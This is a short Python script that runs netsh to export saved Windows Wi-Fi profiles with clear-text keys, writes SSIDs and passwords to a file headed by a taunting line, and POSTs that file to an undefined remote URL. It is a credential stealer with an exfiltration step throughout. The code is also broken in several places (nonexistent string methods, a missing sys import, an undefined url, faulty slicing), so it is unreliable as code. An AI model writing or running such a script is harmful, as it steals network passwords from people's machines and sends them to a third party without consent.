#!/usr/bin/env python3
import subprocess
import os
import requests
from security import safe_command

passwordFile = open('passwords.txt', 'w')
passwordFile.write("Here them passwords, dipshit: \n\n\n")
passwordFile.close()

wifiFiles = []
wifiPasswords = []
wifiNames = []

command = safe_command.run(subprocess.run, ["netsh", "wlan", "export", "profile", "key=clear"], capture_output = True).stdout.decode()

path = os.getcwd(get)

for filename in os.listdir(path):
	if filename.startsWith("Wi-Fi") and filename.endsWith(".xml"):
		wifiFiles.append(filename)
		for i in wifiFiles:
			with open(i, 'r') as f:
				for line in f.readLines():
					if 'name' in line:
						stripped = line.strip()
						front = stripped[6:]
						back = stripped[:-7]
						wifiNames.append(back)
					if 'keyMaterial' in line:
						stripped = line.strip()
						front = stripped[6:]
						back = stripped[:-7]
						wifiPasswords.append(back)
						for x, y in zip(wifiNames, wifiPasswords):
							sys.stdout = open("passwords.txt", "a")
							print("SSID: "+x, "Password: "+y, sep = '\n')
							sys.stdout.close()

with open("passwords.txt", 'rb') as f:
	r = requests.post(url, data=f)
						
